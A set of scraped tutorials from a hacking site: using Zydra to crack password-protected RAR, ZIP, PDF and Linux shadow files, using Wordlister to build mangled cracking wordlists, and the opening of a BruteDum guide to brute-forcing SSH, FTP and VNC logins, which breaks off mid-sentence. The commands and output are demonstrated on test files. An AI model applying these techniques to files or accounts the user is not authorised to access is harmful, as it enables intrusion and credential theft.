[
    {
        "title": "Crack Password-Protected ZIP Files, PDFs & More with Zydra",
        "link": "https://null-byte.wonderhowto.com/how-to/crack-password-protected-zip-files-pdfs-more-with-zydra-0207607/",
        "content": "* WonderHowTo\nEverybody knows not to store sensitive information in unencrypted files, right? PDFs and ZIP files can often contain a treasure trove of information, such as network diagrams, IP addresses, and login credentials. Sometimes, even certain files that are encrypted aren't safe from attackers. That's where Zydra comes in — a tool for cracking RAR files, ZIP files, PDF files, and Linux shadow files.\nHow Are These Files Encrypted?\nDepending on the program used and its version, these sorts of files could be password protected using various encryption algorithms.\nFor example, the Linux command line zip utility uses the older PKZIP algorithm, which is insecure and easy to crack. Other programs, like WinZip and 7-Zip, use strong AES-256 encryption. Earlier versions of the RAR protocol use a proprietary encryption algorithm, while newer versions use AES. WinRAR and PeaZip, popular choices that can deal with RAR files, also use the AES standard.\n* Don't Miss: Crack Shadow Hashes After Getting Root on a Linux System\nIf you're using Linux, it's easy to create PDFs in LibreOffice by exporting regular word documents, and there's even an option to password protect the newly created file. Older versions of LibreOffice use the Blowfish algorithm to encrypt files, but versions 3.5 and up use AES. Other methods to create PDF files include Microsoft Office and Adobe Acrobat — Office versions 2007+ and Acrobat versions 7+ all support AES encryption.\nLinux shadow files themselves are not encrypted, but the passwords contained within them are. Encryption algorithms used for these can vary depending on the system, but MD5, SHA-512, SHA-256, Blowfish, and DES are all commonly used.\nDownload & Set Up Zydra\nTo begin, we need to download Zydra from GitHub — use the wget utility to grab the Python file right from the command line:\n~$ wget https://raw.githubusercontent.com/hamedA2/Zydra/master/Zydra.py\n--2020-07-15 18:41:25--  https://raw.githubusercontent.com/hamedA2/Zydra/master/Zydra.py\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 30544 (30K) [text/plain]\nSaving to: ‘Zydra.py’\nZydra.py             100%[======================>]  29.83K  --.-KB/s    in 0.04s\n2020-07-15 18:41:26 (764 KB/s) - ‘Zydra.py’ saved [30544/30544]\nNext, and this step is completely optional, let's rename the script making it entirely lowercase. If you're lazy like me, it's just one less key to press:\n~$ mv Zydra.py zydra.py\nWe also need to install some dependencies for Zydra to work properly — it uses Python 3, so we can use pip3 to install the extra modules:\n~$ pip3 install rarfile pyfiglet py-term\nCollecting rarfile\nDownloading rarfile-3.1.tar.gz (121 kB)\n|████████████████████████████████| 121 kB 1.0 MB/s\nRequirement already satisfied: pyfiglet in /usr/lib/python3/dist-packages (0.8.post0)\nCollecting py-term\nDownloading py-term-0.6.tar.gz (5.4 kB)\nBuilding wheels for collected packages: rarfile, py-term\nBuilding wheel for rarfile (setup.py) ... done\nCreated wheel for rarfile: filename=rarfile-3.1-py3-none-any.whl size=24908 sha256=6f16c1h4b06a3f7a7d8v4baa34e9a6d58a949b5a78c2b23bb60c0d62791372e3\nStored in directory: /home/kali/.cache/pip/wheels/21/50/d0/8da8b10f46113f46c6f0247c5f59401293fb5b15aa7888a4ce\nBuilding wheel for py-term (setup.py) ... done\nCreated wheel for py-term: filename=py_term-0.6-py3-none-any.whl size=6268 sha256=ab75424c7aa6ef71001a24c3e3a558ad3748ee0d6a3c0153c3a0cf955f814a13\nStored in directory: /home/kali/.cache/pip/wheels/76/cc/73/8ac13320a2a98600008575b936742bbb6025d21d674ca6e2fd\nSuccessfully built rarfile py-term\nInstalling collected packages: rarfile, py-term\nSuccessfully installed py-term-0.6 rarfile-3.1\nNow we should be ready to run Zydra using the python3 command:\n~$ python3 zydra.py\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n_______           ______   _______  _______\n/ ___   )|\\     /|(  __  \\ (  ____ )(  ___  )\n\\/   )  |( \\   / )| (  \\  )| (    )|| (   ) |\n/   ) \\ (_) / | |   ) || (____)|| (___) |\n/   /   \\   /  | |   | ||     __)|  ___  |\n/   /     ) (   | |   ) || (\\ (   | (   ) |\n/   (_/\\   | |   | (__/  )| ) \\ \\__| )   ( |\n(_______/   \\_/   (______/ |/   \\__/|/     \\|\nAuthor : Hamed Hosseini\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nUsage: zydra.py [options] [args]\nDictionary Mode:\nzydra.py -f <file> -d <wordlist>\nBrute force Mode:\nzydra.py -f <file> -b <char_type> -m <min_length> -x <max_length>\nAvailable char_type:\n<lowercase>  The lowercase letters abcdefghijklmnopqrstuvwxyz\n<uppercase>  The uppercase letters ABCDEFGHIJKLMNOPQRSTUVWXYZ\n<letters>    The concatenation of the lowercase and uppercase\n<digits>     numbers 0123456789\n<symbols>    punctuation characters !#$%&'()*+,-./:;<=>?@[\\]^_`{|}~'\"\n<space>      space character\nYou can select multiple character types.\nExample: zydra.py -f <file> -b <space,digits> -m 1 -x 8\nzydra.py: error:  Choose a file, Use --help for more info\nThis gives us a nice little banner, a usage example, and some information about some of the options available. It also gives us an error stating it needs a file, and tells us to use --help for more info; this will give us more details and options:\n~$ python3 zydra.py --help\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n_______           ______   _______  _______\n/ ___   )|\\     /|(  __  \\ (  ____ )(  ___  )\n\\/   )  |( \\   / )| (  \\  )| (    )|| (   ) |\n/   ) \\ (_) / | |   ) || (____)|| (___) |\n/   /   \\   /  | |   | ||     __)|  ___  |\n/   /     ) (   | |   ) || (\\ (   | (   ) |\n/   (_/\\   | |   | (__/  )| ) \\ \\__| )   ( |\n(_______/   \\_/   (______/ |/   \\__/|/     \\|\nAuthor : Hamed Hosseini\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nUsage: zydra.py [options] [args]\nDictionary Mode:\nzydra.py -f <file> -d <wordlist>\nBrute force Mode:\nzydra.py -f <file> -b <char_type> -m <min_length> -x <max_length>\nAvailable char_type:\n<lowercase>  The lowercase letters abcdefghijklmnopqrstuvwxyz\n<uppercase>  The uppercase letters ABCDEFGHIJKLMNOPQRSTUVWXYZ\n<letters>    The concatenation of the lowercase and uppercase\n<digits>     numbers 0123456789\n<symbols>    punctuation characters !#$%&'()*+,-./:;<=>?@[\\]^_`{|}~'\"\n<space>      space character\nYou can select multiple character types.\nExample: zydra.py -f <file> -b <space,digits> -m 1 -x 8\n-h, --help    show this help message and exit\n-d DICTFILE   Specifies dictionary file\n-f FILE       Specifies the file\n-b CHARTYPE   Specifies the character type\n-m MINLENGTH  Specifies minimum length of password\n-x MAXLENGTH  Specifies maximum length of password\nBefore we can run Zydra, we will need some files to test it out on. I have created a RAR file, ZIP file, and PDF file that you can download and use to follow along. The password for all three of these is \"password1\" as you'll soon find out. There is also a shadow file you can download, which I got from the Metasploitable virtual machine.\n* Download: all test files | .rar test | .zip test | .pdf test | .shadow test\nWe'll also need a suitable wordlist. Since our password for these files is pretty simple, we'll use a minimal list for demonstration purposes — this one from the SecLists GitHub repo will work:\n~$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10.txt\n--2020-07-15 19:08:05--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10.txt\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 81 [text/plain]\nSaving to: ‘darkweb2017-top10.txt’\ndarkweb2017-top10.tx 100%[======================>]      81  --.-KB/s    in 0s\n2020-07-15 19:08:05 (3.10 MB/s) - ‘darkweb2017-top10.txt’ saved [81/81]\nAt this point, we are ready to get cracking.\nOption 1: Cracking RAR Files\nZydra can operate in two modes: dictionary and brute force. In dictionary mode, we just need to supply a wordlist with the -d flag. We also need to specify the file we are trying to crack using the -f flag:\n~$ python3 zydra.py -f nb-rar.rar -d darkweb2017-top10.txt\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n_______           ______   _______  _______\n/ ___   )|\\     /|(  __  \\ (  ____ )(  ___  )\n\\/   )  |( \\   / )| (  \\  )| (    )|| (   ) |\n/   ) \\ (_) / | |   ) || (____)|| (___) |\nok   /   /   \\   /  | |   | ||     __)|  ___  |\n/   /     ) (   | |   ) || (\\ (   | (   ) |\n/   (_/\\   | |   | (__/  )| ) \\ \\__| )   ( |\n(_______/   \\_/   (______/ |/   \\__/|/     \\|\nAuthor : Hamed Hosseini\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nStart time ==> Wed Jul 15 19:08:15 2020\nStarting password cracking for /root/nb/nb-rar.rar /\n[*] Count of possible passwords: 10\nProgress : [#####################################     ] 80.000 %\n[+] Password Found: password1\nEnd time ==> Wed Jul 15 19:08:41 2020\nExecution time ==> 0:00:25.876620\nOnce it starts, it gives us the possible password count (basically, how many lines there are in the wordlist) and a progress bar. It doesn't take long before it finds the password and tells us what it is.\nFor brute force mode, we need to set a few more options. We still specify the file to crack, but now we can use the -b flag to set the character types to use for brute forcing. The minimum and maximum length of the password can also be set now, using the -m and -x flags, respectively:\n~$ python3 zydra.py -f nb-rar.rar -b letters,digits -m 1 -x 10\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n_______           ______   _______  _______\n/ ___   )|\\     /|(  __  \\ (  ____ )(  ___  )\n\\/   )  |( \\   / )| (  \\  )| (    )|| (   ) |\n/   ) \\ (_) / | |   ) || (____)|| (___) |\n/   /   \\   /  | |   | ||     __)|  ___  |\n/   /     ) (   | |   ) || (\\ (   | (   ) |\n/   (_/\\   | |   | (__/  )| ) \\ \\__| )   ( |\n(_______/   \\_/   (______/ |/   \\__/|/     \\|\nAuthor : Hamed Hosseini\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nStart time ==> Wed Jul 15 19:09:01 2020\nStarting password cracking for /root/nb/nb-rar.rar /\n[*] Count of possible passwords: 853058371866181866\nProgress : [                                          ] 0.000 %\nAs you can see, the number of potential passwords is quite large, so while this feature can be useful in certain cases, most of the time it is wise to use the dictionary mode.\nNow that we have the password, we can extract the contents of the RAR file with the following command:\n~$ unrar x nb-rar.rar\nUNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal\nExtracting from nb-rar.rar\nEnter password (will not be echoed) for test.txt:\nOption 2: Cracking ZIP Files\nCracking ZIP files works pretty much the same way — we'll only use dictionary mode from here on out since it is way more efficient. Just specify the file to crack and wordlist to use:\n~$ python3 zydra.py -f nb-zip.zip -d darkweb2017-top10.txt\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n_______           ______   _______  _______\n/ ___   )|\\     /|(  __  \\ (  ____ )(  ___  )\n\\/   )  |( \\   / )| (  \\  )| (    )|| (   ) |\n/   ) \\ (_) / | |   ) || (____)|| (___) |\nok   /   /   \\   /  | |   | ||     __)|  ___  |\n/   /     ) (   | |   ) || (\\ (   | (   ) |\n/   (_/\\   | |   | (__/  )| ) \\ \\__| )   ( |\n(_______/   \\_/   (______/ |/   \\__/|/     \\|\nAuthor : Hamed Hosseini\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nStart time ==> Wed Jul 15 19:09:45 2020\nStarting password cracking for /root/nb/nb-zip.zip /\n[*] Count of possible passwords: 10\nProgress : [#####################################     ] 80.000 %\n[+] Password Found: password1\nEnd time ==> Wed Jul 15 19:10:10 2020\nExecution time ==> 0:00:25.062398\nWe can see it found the password again with no issues.\nTo extract the contents of the ZIP archive, use the unzip command:\n~$ unzip nb-zip.zip\nArchive:  nb-zip.zip\n[nb-zip.zip] example.txt password:\nOption 3: Cracking PDF Files\nFor Zydra to work with PDF files, we need to install a program called qpdf first:\n~$ sudo apt install qpdf\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\nThe following NEW packages will be installed:\nlibqpdf28 qpdf\n0 upgraded, 2 newly installed, 0 to remove and 568 not upgraded.\nNeed to get 1,015 kB of archives.\nAfter this operation, 2,690 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nGet:1 http://kali.download/kali kali-rolling/main amd64 libqpdf28 amd64 10.0.1-2 [479 kB]\nGet:2 http://kali.download/kali kali-rolling/main amd64 qpdf amd64 10.0.1-2 [537 kB]\nFetched 1,015 kB in 1s (830 kB/s)\nSelecting previously unselected package libqpdf28:amd64.\n(Reading database ... 377060 files and directories currently installed.)\nPreparing to unpack .../libqpdf28_10.0.1-2_amd64.deb ...\nUnpacking libqpdf28:amd64 (10.0.1-2) ...\nSelecting previously unselected package qpdf.\nPreparing to unpack .../qpdf_10.0.1-2_amd64.deb ...\nUnpacking qpdf (10.0.1-2) ...\nSetting up libqpdf28:amd64 (10.0.1-2) ...\nSetting up qpdf (10.0.1-2) ...\nProcessing triggers for libc-bin (2.30-4) ...\nProcessing triggers for man-db (2.9.1-1) ...\nProcessing triggers for kali-menu (2020.2.2) ...\nNow we can crack the PDF by providing the file and wordlist to use, just like before:\n~$ python3 zydra.py -f nb-sample.pdf -d darkweb2017-top10.txt\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n_______           ______   _______  _______\n/ ___   )|\\     /|(  __  \\ (  ____ )(  ___  )\n\\/   )  |( \\   / )| (  \\  )| (    )|| (   ) |\n/   ) \\ (_) / | |   ) || (____)|| (___) |\nok   /   /   \\   /  | |   | ||     __)|  ___  |\n/   /     ) (   | |   ) || (\\ (   | (   ) |\n/   (_/\\   | |   | (__/  )| ) \\ \\__| )   ( |\n(_______/   \\_/   (______/ |/   \\__/|/     \\|\nAuthor : Hamed Hosseini\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nStart time ==> Wed Jul 15 19:10:30 2020\nStarting password cracking for /root/nb/nb-sample.pdf /\n[*] Count of possible passwords: 10\nProgress : [#####################################     ] 80.000 %\n[+] Password Found: password1\n[*] Your decrypted file is decrypted_nb-sample.pdf\nEnd time ==> Wed Jul 15 19:10:55 2020\nExecution time ==> 0:00:25.118694\nAgain, we can see it found the password, but this time there is an additional dialogue. This is simply telling us the file is a decrypted version of the original, which we can verify with the file command:\n~$ file decrypted_nb-sample.pdf\ndecrypted_nb-sample.pdf: PDF document, version 1.4\nOption 4: Cracking Shadow Files\nZydra will automatically attempt to crack the password hashes for any users found in Linux shadow files. While it's not always successful, this can be a good method to try out first since it is quick and easy.\nAll we need to do is specify the file with the -f flag and the wordlist with the -d flag:\n~$ python3 zydra.py -f nb-shadow -d darkweb2017-top10.txt\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n_______           ______   _______  _______\n/ ___   )|\\     /|(  __  \\ (  ____ )(  ___  )\n\\/   )  |( \\   / )| (  \\  )| (    )|| (   ) |\n/   ) \\ (_) / | |   ) || (____)|| (___) |\nok   /   /   \\   /  | |   | ||     __)|  ___  |\n/   /     ) (   | |   ) || (\\ (   | (   ) |\n/   (_/\\   | |   | (__/  )| ) \\ \\__| )   ( |\n(_______/   \\_/   (______/ |/   \\__/|/     \\|\nAuthor : Hamed Hosseini\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nStart time ==> Wed Jul 15 19:11:03 2020\nStarting password cracking for /root/nb/nb-shadow /\n[*] Count of possible passwords: 10\n[**] cracking Password for: root\nProgress : [##############################################] 100.000 %\n[-] password not found\n[**] cracking Password for: sys\n[**] cracking Password for: klog\n[**] cracking Password for: msfadmin\n[**] cracking Password for: postgres\n[**] cracking Password for: user\n[**] cracking Password for: service\nEnd time ==> Wed Jul 15 19:11:26 2020\nExecution time ==> 0:00:22.062705\nWe can see it finds several users, but since we are only using a simple wordlist, it fails to find the password for any of them. Like any other cracking tool, using a more extensive wordlist will increase your chances of successfully recovering a password, but it will also take longer.\nWrapping Up\nIn this tutorial, we explored a tool called Zydra and how it can be used to crack password-protected RAR files, ZIP files, PDF files, and Linux shadow files. While we cracked these with little to no difficulty, using strong passwords will greatly increase the time and effort it takes to do so.",
        "category": "Password Cracking"
    },
    {
        "title": "Use Wordlister to Create Custom Password Combinations for Cracking",
        "link": "https://null-byte.wonderhowto.com/how-to/use-wordlister-create-custom-password-combinations-for-cracking-0206006/",
        "content": "* WonderHowTo\nPassword cracking is a specialty of some hackers, and it's often thought that raw computing power trumps everything else. That is true in some cases, but sometimes it's more about the wordlist. Making a custom, targeted wordlist can cut down cracking time considerably, and Wordlister can help with that.\nWordlister vs Other Wordlist Generators\nWordlister is a wordlist generator and mangler written in Python that can be used to create custom password combinations for cracking. Its main features include multiprocessing for faster speeds and a handful of useful permutation options, including leetspeak, capitalization, and the ability to append and prepend words.\n* Don't Miss: Use Leaked Password Databases to Create Brute-Force Wordlists\nCrunch is a popular wordlist generator that also creates multiple combinations of passwords, but it relies more on patterns and characters than input files. Also, Crunch requires a flag to be set to limit duplicates, something that Wordlister handles automatically.\nCeWL is another popular wordlist generator, although it is a different beast altogether. The tool works by spidering webpages and uses words from there to create custom password lists. CeWL could actually be a useful counterpart to Wordlister; by feeding Wordlister the output of CeWL scraping a webpage, even more targeted password lists could be created.\nUsing Wordlister & All Its Options\nWe will be working on Kali Linux to show off Wordlister, but any other Linux distro should suffice.\nThe first thing we need to do is download Wordlister from GitHub. We can use the wget utility to retrieve it over HTTP directly from our terminal:\n~# wget https://raw.githubusercontent.com/4n4nk3/Wordlister/master/wordlister.py\n--2020-05-03 12:45:36--  https://raw.githubusercontent.com/4n4nk3/Wordlister/master/wordlister.py\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.148.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.148.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 6195 (6.0K) [text/plain]\nSaving to: ‘wordlister.py’\nwordlister.py                                         100%[======================================================================================================================>]   6.05K  --.-KB/s    in 0s\n2020-05-03 12:45:36 (18.5 MB/s) - ‘wordlister.py’ saved [6195/6195]\nThe script needs Python 3 to work correctly, so if it's not already installed, do so with the following command:\n~# apt-get install python3\nNow we can run the script with the python3 command:\n~# python3 wordlister.py\nusage: wordlister.py [-h] --input INPUT --perm PERM --min MIN --max MAX\n[--test TEST] [--cores CORES] [--leet] [--cap] [--up]\n[--append APPEND] [--prepend PREPEND]\nwordlister.py: error: the following arguments are required: --input, --perm, --min, --max\nThat gives us some usage information and includes which arguments are required. We can append the -h flag to see the help menu, which is a little more organized and informative:\n~# python3 wordlister.py -h\nusage: wordlister.py [-h] --input INPUT --perm PERM --min MIN --max MAX\n[--test TEST] [--cores CORES] [--leet] [--cap] [--up]\n[--append APPEND] [--prepend PREPEND]\nA simple wordlist generator and mangler written in python.\noptional arguments:\n-h, --help         show this help message and exit\n--test TEST        Output first N iterations (single process/core)\n--cores CORES      Manually specify processes/cores pool that you want to\n--leet             Activate l33t mutagen\n--cap              Activate capitalize mutagen\n--up               Activate uppercase mutagen\n--append APPEND    Append chosen word (append 'word' to all passwords)\n--prepend PREPEND  Append chosen word (prepend 'word' to all passwords)\nrequired arguments:\n--input INPUT      Input file name\n--perm PERM        Max number of words to be combined on the same line\n--min MIN          Minimum generated password length\n--max MAX          Maximum generated password length\nTo use Wordlister, we first need an input file containing a list of passwords we wish to create permutations for and mangle.\nUsing your favorite text editor, create a text file containing a few common passwords (I am only using a small number of passwords here for demonstration purposes because the permutations can get quite large). Here's what mine looks like:\n~# cat list.txt\nNow, we're ready to run the script. Here are the required arguments:\n* input = the name of the text file containing passwords\n* perm = the number of permutations to be combined on the same line\n* min = the minimum length of any generated password\n* max = the maximum length of any generated password\nHere is the full command and its output:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32\nsecretpassword\nsecrethunter2\nsecretiloveyou\npasswordsecret\npasswordhunter2\npasswordiloveyou\nhunter2password\nhunter2iloveyou\niloveyousecret\nhunter2secret\niloveyoupassword\niloveyouhunter2\nWe can see that it merely combined the given passwords into all possible permutations.\nWordlister contains a handful of useful arguments that are optional, as well. The leet option will transform any letters into numbers using leetspeak:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --leet\niloveyouhunter2\niloveyoupassword\n1l0v3y0uhunt3r2\n1l0v3y0up455w0rd\niloveyousecret\n1l0v3y0u53cr3t\nhunter2iloveyou\nhunt3r21l0v3y0u\nhunter2password\nhunt3r2p455w0rd\npasswordiloveyou\np455w0rd1l0v3y0u\npasswordhunter2\np455w0rdhunt3r2\nhunter2secret\npasswordsecret\np455w0rd53cr3t\nsecretiloveyou\nhunt3r253cr3t\n53cr3t1l0v3y0u\nsecrethunter2\n53cr3thunt3r2\nsecretpassword\n53cr3tp455w0rd\nThe cap option will capitalize the first letter of each password:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --cap\nIloveyouSecret\nIloveyouhunter2\nIloveyoupassword\nIloveyouHunter2\nIloveyousecret\nIloveyouPassword\nSecretIloveyou\nSecretpassword\nSecretiloveyou\nSecretHunter2\nSecrethunter2\npasswordiloveyou\npasswordHunter2\niloveyouSecret\npasswordhunter2\niloveyoupassword\npasswordsecret\niloveyouHunter2\niloveyouhunter2\nSecretPassword\niloveyousecret\niloveyouPassword\npasswordIloveyou\npasswordSecret\nHunter2Iloveyou\nHunter2Secret\nHunter2password\nHunter2secret\nHunter2iloveyou\nHunter2Password\nhunter2Secret\nhunter2Iloveyou\nhunter2password\nhunter2iloveyou\nhunter2secret\nsecretPassword\nPasswordIloveyou\nhunter2Password\nPasswordSecret\nPasswordiloveyou\nsecretpassword\nsecretIloveyou\nPasswordHunter2\nPasswordhunter2\nsecretiloveyou\nPasswordsecret\nsecretHunter2\nsecrethunter2\nThe up option will transform every letter in a word into uppercase:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --up\nSECREThunter2\nSECRETpassword\nSECRETHUNTER2\nSECRETILOVEYOU\nSECRETPASSWORD\nSECRETiloveyou\nsecrethunter2\nsecretpassword\nsecretHUNTER2\nsecretILOVEYOU\nhunter2password\nhunter2iloveyou\nhunter2ILOVEYOU\nhunter2PASSWORD\npasswordSECRET\npasswordHUNTER2\npasswordsecret\npasswordILOVEYOU\npasswordhunter2\npasswordiloveyou\nHUNTER2SECRET\nHUNTER2secret\nHUNTER2ILOVEYOU\nHUNTER2PASSWORD\nHUNTER2password\nHUNTER2iloveyou\nILOVEYOUsecret\nILOVEYOUSECRET\nILOVEYOUhunter2\nILOVEYOUpassword\nsecretPASSWORD\nILOVEYOUHUNTER2\nsecretiloveyou\nhunter2SECRET\nhunter2secret\nILOVEYOUPASSWORD\nPASSWORDhunter2\nPASSWORDSECRET\nPASSWORDHUNTER2\nPASSWORDsecret\nPASSWORDILOVEYOU\nPASSWORDiloveyou\niloveyouSECRET\niloveyousecret\niloveyouhunter2\niloveyoupassword\niloveyouHUNTER2\niloveyouPASSWORD\nThe append option will append any given word to all passwords:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --append 1969\npassword1969\niloveyou1969\nhunter21969\nsecretpassword\nsecretpassword1969\nsecretiloveyou\nsecretiloveyou1969\nsecrethunter2\nsecrethunter21969\npasswordsecret\npasswordsecret1969\npasswordiloveyou\npasswordiloveyou1969\npasswordhunter2\npasswordhunter21969\niloveyousecret\niloveyousecret1969\niloveyoupassword\niloveyoupassword1969\niloveyouhunter2\niloveyouhunter21969\nhunter2secret\nhunter2secret1969\nhunter2password\nhunter2password1969\nhunter2iloveyou\nhunter2iloveyou1969\nThe prepend option will prepend any given word to all passwords:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --prepend Dave\nDaveiloveyou\nDavepassword\nDavehunter2\nsecretiloveyou\nDavesecretiloveyou\nsecretpassword\nDavesecretpassword\nsecrethunter2\nDavesecrethunter2\niloveyoupassword\niloveyouhunter2\nDaveiloveyouhunter2\nDaveiloveyoupassword\npasswordsecret\nDavepasswordsecret\niloveyousecret\nDaveiloveyousecret\npasswordiloveyou\nDavepasswordiloveyou\npasswordhunter2\nDavepasswordhunter2\nhunter2secret\nDavehunter2secret\nhunter2iloveyou\nDavehunter2iloveyou\nhunter2password\nDavehunter2password\nAnd, of course, any of these options can be combined for a greater number of potential passwords:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --leet --cap --append 1969\nhunter21969\nhunt3r21969\nPassword1969\nP455w0rd1969\nIloveyou1969\niloveyou1969\n1l0v3y0u1969\n1l0v3y0u1969\npassword1969\np455w0rd1969\nHunter21969\nHunt3r21969\nsecrethunter2\nsecrethunter21969\nsecretpassword\nsecretpassword1969\n53cr3thunt3r2\n53cr3thunt3r21969\nsecretPassword\n53cr3tp455w0rd\nsecretPassword1969\n53cr3tp455w0rd1969\n53cr3tP455w0rd\nThis list can grow quite long from only a few initial passwords, so it can be advantageous when creating a custom wordlist for targeted password cracking.\nRather than printing the results to the terminal screen, we can direct the output to a text file that can be used for cracking later:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --leet --cap --append 1969 > mywordlist.txt\nWordlister has a feature that will only output the specified number of iterations, too, in case we wanted to control the length of our list a little better. Use the test option to do so:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --test 10\npasswordsecret\npasswordiloveyou\npasswordhunter2\nsecretpassword\nsecretiloveyou\nsecrethunter2\nWe can also manually specify the number of cores to use with the cores option. It can be useful when we don't want all of our resources being hogged at once:\n~# python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --cores 1\nhunter2password\nhunter2secret\nhunter2iloveyou\npasswordhunter2\npasswordsecret\npasswordiloveyou\nsecrethunter2\nsecretpassword\nsecretiloveyou\niloveyouhunter2\niloveyoupassword\niloveyousecret\nAs we can see, this simple tool can be incredibly powerful when it comes to creating targeted wordlists.\nCommon Password Mistakes\nOften, compromised passwords are all a hacker needs to gain access to a system. Strong passwords should be one of the most important aspects of maintaining a proper security posture, but a lot of mistakes are made when it comes to this simple principle.\nPasswords that are too short and passwords comprised only of letters are trivial to crack with any modern computer. Likewise, varying passwords by only one letter, or using numbers instead of letters (leetspeak), is something most cracking software takes into account already.\n* Don't Miss: How to Create Stronger Passwords (Advice from a Hacker)\nUsing a password that is too old and using the same password everywhere makes it much more likely to be compromised over time. Passwords that are created using personal details are also a no-go because any decent hacker will be able to find out specific information that makes these passwords just as easy to crack.\nKeeping your password a secret is also essential. That means no sharing it with anyone, and no writing it down on sticky notes next to your computer, however tempting it might be.\nWrapping Up\nToday, we learned how to use a tool called Wordlister to create custom password combinations for cracking. First, we looked at a couple of other popular wordlist generators and how they compare to Wordlister. Next, we explored the tool and its options to create a list of custom password permutations. Finally, we covered some common mistakes that are made when coming up with passwords.\nWordlister is a powerful tool that can be used to create custom, targeted wordlists — something that should be valuable to any hacker.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Steve Johnson/Pexels; Screenshots by drd_/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Brute-Force SSH, FTP, VNC & More with BruteDum",
        "link": "https://null-byte.wonderhowto.com/how-to/brute-force-ssh-ftp-vnc-more-with-brutedum-0197449/",
        "content": "* WonderHowTo\nBrute-forcing is an easy way of discovering weak login credentials and is often one of the first steps when a hacker finds network services running on a network they gain access to. For beginners and experienced hackers alike, it's useful to have access to the right tools to discover, classify, and then launch customized brute-force attacks against a target. BruteDum does it all from a single framework.\nWeak Passwords Are Easy Prey\nWhen a hacker gains access to a system with services running on it, one of the first things they'll typically do is see if they can log in to any of those services using default or common credentials. Internet of Things (IoT) hardware and devices like routers are often left with default passwords enabled, making them easy to attack.\nTo test the services they discover for weak passwords, the hacker needs to select the right tool for the job, and it can be confusing to know which tool is the best to use against a particular service.\n* Don't Miss: Use Facial Recognition for OSINT on Individuals & Companies\nBruteDum is a Python tool that allows a hacker to acquire a target first and run a scan inside the framework to determine the best tool based on what is discovered. It's easy to run a brute-force or dictionary attack against nearly any standard protocol that's vulnerable to it.\nThe advantage of running BruteDum over specific tools is the ability to run a scan from within to identify what other processes may be running on the same device, as well as organizing powerful tools for breaking into user accounts on services like SSH.\nOnline or Connected Attacks\nUnlike attacks launched against WPA networks where we can grab a hash and attempt cracking later, we need to be connected to our target directly over the network to try a brute-forcing or dictionary attack. While there are ways of hiding our identity with a VPN or Tor, brute-force and dictionary attacks can be limited in effectiveness through a variety of different means.\nOne way of limiting brute-force and dictionary attacks is through rate-limiting, in which a lockout is triggered after a set amount of incorrect login attempts. That, combined with flagging suspicious login attempts, can make brute-force and dictionary assaults more likely to alert a target that they are under attack.\nTo execute an online dictionary attack, we'll be using THC Hydra, Medusa, or Ncrack against the services we discover, using BruteDum to scan and organize our attacks between these tools. We'll also need a password list, which will be critical to the success or failure of our dictionary attack. If the password list is too large, it will take too long to attack the network, and if it isn't reasonably long enough to contain the password, we run the risk of it not being in the list, causing the attack to fail.\nWhat You'll 